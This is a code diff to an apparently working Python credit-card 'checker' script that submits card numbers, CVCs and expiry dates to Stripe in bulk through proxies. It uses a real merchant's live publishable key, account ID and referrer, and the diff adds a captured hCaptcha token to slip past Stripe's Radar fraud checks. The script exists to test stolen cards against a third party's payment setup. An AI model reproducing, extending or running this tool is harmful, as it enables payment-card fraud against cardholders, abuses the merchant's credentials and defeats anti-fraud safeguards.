@@ -562,8 +562,8 @@ def get_final_message(website_response, proxy_str):
     except:
         return "Unknown response"
 
-def stripe_payment_flow(cc_line):
-    """Complete Stripe payment flow for a single card"""
+def check_card_stripe(cc_line):
+    """Main function to check card via Stripe (single card) with retry logic"""
     start_time = time.time()
     max_retries = 2
     
@@ -666,7 +666,7 @@ DECLINED CC ❌
             # First Request: Create Payment Method with Stripe
             print("Step 1: Creating payment method with Stripe...")
             
-            stripe_data = f'billing_details[name]=+&billing_details[email]={generate_random_email()}&billing_details[address][country]=ZW&type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy_stripe}&card[exp_month]={mm}&allow_redisplay=unspecified&pasted_fields=number&payment_user_agent=stripe.js%2F5127fc55bb%3B+stripe-js-v3%2F5127fc55bb%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Ftheherocollectibles.com&time_on_page=95388&client_attribution_metadata[client_session_id]=f7026e63-15a2-4f1a-801a-f2f492a6722b&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=8095e952-f37d-44ac-a7cb-1ff5e4b3ab66&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=ed43bb8e-ae3d-4b29-ac98-92b821d69bc699cd18&muid=ebb7bf4e-b156-4cf6-b276-dcce5bb8bc530ef01f&sid=e824475c-373b-4745-a8fd-8824a98c5161ef1c98&key=pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs&_stripe_account=acct_1LwpPBCLeHcAhGxV'
+            stripe_data = f'billing_details[name]=+&billing_details[email]={generate_random_email()}&billing_details[address][country]=ZW&type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy_stripe}&card[exp_month]={mm}&allow_redisplay=unspecified&pasted_fields=number&payment_user_agent=stripe.js%2F5127fc55bb%3B+stripe-js-v3%2F5127fc55bb%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Ftheherocollectibles.com&time_on_page=95388&client_attribution_metadata[client_session_id]=f7026e63-15a2-4f1a-801a-f2f492a6722b&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=8095e952-f37d-44ac-a7cb-1ff5e4b3ab66&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=ed43bb8e-ae3d-4b29-ac98-92b821d69bc699cd18&muid=ebb7bf4e-b156-4cf6-b276-dcce5bb8bc530ef01f&sid=e824475c-373b-4745-a8fd-8824a98c5161ef1c98&key=pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs&_stripe_account=acct_1LwpPBCLeHcAhGxV&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzYzMTkzNzc4LCJjZGF0YSI6Ii9aNGFiMHk2TG5meDZyZ2V2UHI1WEcyYWZ6ajdNMGc4NFRwblpQcE1BczAzU0RpTEROMk1vdlQxMHhpMFlRN1lwanlOTjdxcWQ1MXdiaytHOFJWRkNKOE0vMFZuZ0ZSem5kODdEQnVEWUowU1hraTZYaWQ3amc3bGJRQmM1aWZ4SnllMmxpZldjb25iVWJMbEVoRkIvYzRuRjNlbjF3K2FxVGlZeml5SGNldjFEaVhEaFpaSVVlekU0OVRyV3dOdFd0YklSV1V5VUdZZW54MDYiLCJwYXNza2V5IjoiSmVoSzBHVENSUzZPSUVQbUNyc3hZN2R1OVZDcDk0STQ2TXhNdUdHRHF0Y3NhL1BkRFExUmsxY3Y0WjRlaDRidklNWDJiY0dEU2RXTFcxTU9nYS8xSS9GVlJzYnByaEpERy83cTRPbDR1WlS4aHpXQmJIOHdlNlRKdS9oM3hsSTFYelNVNHE1eXR0ZGUvb1BWRlZpa0JuQjZwU2x5U2dUak8rOTkrV0NTMlB4K1lLYzBOdkVBVXRza2R2RkZ4RmV1aG9kTExHT0lzTjJDbnVrZjNrVm1UeEtjdU9jN3RUUy9jWDl4VDRLOVRyQjhXSmpPNmhFeWx1TWhaQWxGdmNwUFN4LzlDcWRuRkd5ODFsUzQ2RDJJQ0JLbEZ0NXhwY2pvcHhmWlQ1RHBrVDd3N3hxWHBZRU1jTDJqU1lzblRUcEYxc0w0U2pGc3V6blR4Y0NidnlaSWVma21yelN2TW1mUEQ4ZFBDQ1p1c1dDTzJqczZtMkC3MndsOWF6bnNnVlNDL3V3M3JTVFpWaXFHSWxlMlJVc04xbjdxZnh0TEpaK3EySGltVVYxZ3d6YnQzeXkwNCt1OXBoVWl3cE5VRU94amUvK2U0TS92M3N4Zk5DRnEvTzI1b0pMaVc3Y3FGbThVeXdzS0RNYVJQMFBYeW1nWGFBRE91TjVmdEVSOEdLQW5GY0RKd1l6eDBSaVZ3YzlqSzE0ZDJCbG1XcUhISDczcTlGa3h0bnc2TUFEN2JtVWxmOUhyVDFVMEhLQ0NlelhqUW9tU2FUdXVDNHNnRGhBK1pPU0gvNzJWRmlKbWZ3L2UyZUMyNFhVZlUrTmkvQ0xzQUtGOVA3Ui9pM2pHWU1nMm1EejRtb3oxRGhnaTlTWE5aSFJaQ0hCNUY3YlBsZks3WWgyanVsd0RiT0xZOWJIcS9uTXhsVW1iWnJ5UFVQUXUrT2N5WWtsV3h0R09jTVYrUnhHZ240SVNWanpEdVlEVzlFbzhnK3JwdUI0QlFFRFRDTFBKNC9mSDlxZEHqNGtrT21DSXZ3UktpdjZ2RjV5SjV5WkZyYVVTK2V4UFF1TGRUL3NPcFRBUFYzZnd6UENyWG9wcmllUWxmdDUrR1A0eWR6ZXpidTJrWUcyRVBGditaVU5LUVhGdGkwNmNQMUdyTktEQzJ3d3l1bjREVDFoRnJ1ckl4M3pDclpyTzllVkg0RTJSd0dlM0V3ZWdHckV4dk5oV29Cd2ltSmhSTUZmNlBDQm5qREk3RE1kbExVRytXUzZReWxxUEsyVDFzY2FiOHFCTTZBRmV0eW1LV0g4UDgrSGoveXlRVFVyUUpFOFNXeFhyaDk5S0wrdDd0eUNWY2FwMjROUGVoTGQraWtRWWhCY2pDbXBUdzMwQUFqemhKTU1QSUlJd2w2WWFjSDlsY3lkK0RYR1NmY216ZWE2MkNCaGVIb05uQ0o5bmJ2ZDg2M2VDRjRHRVV1TWQ5TlM0WXEyMU5GakVJbmlMRHRvRlVKMWw5K2psMGNNaWdyWTFYbHBqa0QyVXdxUlVmT3NqU0ZGS1FSTzZ6ZFFnUjJRdzhuVkhacFM1MjNGbGdReWN2L2k0bFRRWHJjeVlvdThRd1lYUCtxdEQzS0wxM0JuV01DMThZU0RpTHBtVWtIRHBVNVhYS2lla0cwOHBsTXc5bGl3Tyt4TlhJNjJsbVg4TUM2QXZWdDZYRGt5RzRPN3FZUyt5NlpPd01memxXM1VQUzBZR0c1cEFDMW53NktnZytFZG1MNmIxRFZQM3hOa2JoOExZdFMyUTZKVkhPSXZuV0VKT0ptYVpFOWZvTHpNRTBrSGtaU2Nhd00yTFZ0S0FrNDN2dk9PVjdrdkM5LzBQcUg5ZGVsK2lJYUdaYTVRM1V2VDY2MTUrc2dxK2VxdmpPb202WitaZVlKR2liSFFTQ0FiSEkxcERiVittbTg3RTdmMFpZSzJsVEI0ZnBUbk5DYk1vQmtHd2dVa01nTndMQlVscTBBcGFKWUx5akFWMTJnNWdITG1lT3BYK1F2QlczZXYwTzdFY2k1c3FJSHplNGxBbU5aTWdHMVByZEhlUElQcHM0b0srK3UxeWtCdWxxOWRaQWk4RjgwcDNVamdGY2RQMlZPblVSMkk5TytmZlVuRWlSNU8yYUFUTGlVU0hRM0ZGOU9OYnpIZnl2d2x4KzZEZjQwdEVjWC9kcEtRNEpKdDdjNWxDY1IvUXk3dS9IVktIcjhIQkFzS0NRbUo0S2FqQ2hrcTFDdzUxWkZmM2hRSE5wNkV1NFhnNkZzRytTbzk3bjZjb1AxK0lCalV2YmlIYkpVS3pkbEdtUGJ6Q2hLWDJYczRtbnBybUdWSGx2SFVUdEZPY0FXT0FSdXIwb2JVNTlOVEVIcmJGbW9acStrMnVkQjRJcVBDMGQwYkVYZnpIRHZuNExUWVFid253VjhpV0xId3VDL1pUclJwZHh0UEhRMTlVa2d6SjE0d3RJOTdYSE1zOEQvY3VYQ3JMcE95SytGb0lrZ2IwdmpqZFBmd2RnNjJacmpxdlQ3ci9ubHd0YnlnNjI0VFREWTRXcWxiN7UvaE43cm9VWUtHY2Y4QzBoTmVyZlE9PSIsImtyIjoiNDRhZDI3ZWIiLCJzaGFyZF9pZCI6MjU5MTg5MzU5fQ.Jf8qLYQsSgafctzKuBltpNpAQpAihunT3fQ8fg4YI6o'
 
             proxies = parse_proxy(proxy_str)
             
@@ -850,7 +850,7 @@ def check_cards_stripe(cc_lines):
     """Mass check function for multiple cards"""
     results = []
     for cc_line in cc_lines:
-        result = stripe_payment_flow(cc_line)
+        result = check_card_stripe(cc_line)
         results.append(result)
         time.sleep(1)
     return results
@@ -860,5 +860,5 @@ if __name__ == "__main__":
     # Test with a single card
     test_cc = "4111111111111111|12|2025|123"
     print("Testing Stripe checker...")
-    result = stripe_payment_flow(test_cc)
+    result = check_card_stripe(test_cc)
     print(result)
